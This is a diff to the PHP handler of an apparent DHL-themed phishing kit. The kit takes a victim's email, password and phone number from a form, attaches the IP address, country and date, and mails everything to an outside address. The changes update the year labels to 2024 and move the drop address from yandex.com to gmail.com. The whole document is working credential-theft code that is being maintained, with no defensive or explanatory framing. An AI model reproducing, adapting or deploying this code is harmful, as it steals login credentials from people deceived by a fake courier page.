@@ -27,7 +27,7 @@ $password = $_POST['pass'];
 $phone = $_POST['phone'];
 
 
-$message .= "--------------FORM DATA DHL 2020 -----------------\n";
+$message .= "--------------FORM DATA DHL 2024 -----------------\n";
 $message .="Email : $loginemail\n";
 $message .="Password : $password\n";
 $message .="Phone : $phone\n";
@@ -35,13 +35,13 @@ $message .= "----------------IP Address & Date-----------------\n";
 $message .= "IP: ".$ip."\n";
 $message .= "..:: Client Country : $country\n";
 $message .= "Date: ".$adddate."\n";
-$message .= "---------------Created in 2020 By BLOOD----------------\n";
+$message .= "---------------Created in 2024 By BLOOD----------------\n";
 
 
 
 $pfw_header = "From: DHL 2020 LOGZ<hidedomeki@blood.net>";
-$pfw_subject = "DHL 2020 PackaG";
-$pfw_email_to = "dr.barretdavid@yandex.com";
+$pfw_subject = "DHL 2024 PackaG";
+$pfw_email_to = "dr.barretdavid@gmail.com";
 @mail($pfw_email_to, $pfw_subject ,$message ,$pfw_header );
 }else{
 
@@ -49,7 +49,7 @@ $pfw_email_to = "dr.barretdavid@yandex.com";
     $message .= "IP: ".$ip."\n";
     $message .= "..:: Client Country : $country\n";
     $message .= "Date: ".$adddate."\n";
-    $message .= "---------------Created in 2020 By BLOOD----------------\n";
+    $message .= "---------------Created in 2024 By BLOOD----------------\n";
     
     
   
